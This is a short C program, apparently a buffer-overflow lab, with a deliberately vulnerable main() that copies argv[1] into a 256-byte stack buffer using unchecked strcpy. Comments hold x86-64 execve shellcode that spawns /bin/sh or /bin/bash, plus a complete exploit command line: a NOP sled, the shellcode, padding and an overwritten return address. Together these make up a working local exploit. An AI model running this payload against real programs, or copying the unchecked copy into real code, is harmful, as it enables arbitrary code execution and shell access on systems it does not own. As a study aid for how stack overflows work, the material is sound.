#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//bi/sh
//unsigned char code[] ="\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";


//bn/bash
//unsigned char code[] ="\xeb\x13\x5f\x48\x31\xc0\x88\x47\x09\x50\x57\x48\x89\xe6\x48\x89\xc2\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68";


// ./BufferOverflow $(python -c "print('\x90'*200+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*31+'\x74\xde\xff\xff\xff\x7f')")

//last address part may change

int main(int argc, char *argv[])
{
char buff[256];

strcpy(buff,argv[1]);
printf("\n%s\n",buff);
return 0;


}
